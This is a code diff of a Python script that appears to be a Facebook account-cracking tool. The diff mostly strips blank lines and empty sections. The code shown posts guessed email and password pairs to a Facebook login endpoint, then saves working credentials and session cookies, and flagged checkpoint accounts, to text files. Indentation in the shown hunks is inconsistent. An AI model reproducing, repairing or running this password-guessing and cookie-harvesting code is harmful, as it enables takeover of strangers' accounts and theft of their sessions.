@@ -67,15 +67,6 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today() 
-#--------------------------(COUNT BOX)--------------------------#
-
-
-#--------------------------(UA BOX)--------------------------#
-
-    
-
-
-
 #--------------------------(LOGO BOX)--------------------------#
 logo =("""
   \x1b[38;5;46m ________  _______         __    __   ______    ______   __    __ 
@@ -180,28 +171,12 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-       
-         
-       
-         
-         
-       
-        
-          
-     
-         
-        
-          
-          
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
-            
-               
-               
+
                 print(f"\033[38;5;46m[PROTIK MONDAL -OK] {uid}|{ps}")
                 open('/sdcard/PROTIK MONDAL -OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
-         
-           
+      
 #              print(f"\x1b[38;5;196m[PROTIK MONDAL -CP💔] {uid}|{ps}")
                 open('/sdcard/PROTIK MONDAL -CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
@@ -229,9 +204,6 @@ def shoha_menu():
         os.system("clear")
       
         print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Free because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
-        
-       
-     
         
         os.system("xdg-open :https://www.facebook.com/protik.mondal.52459/")
         shoha_menu()   
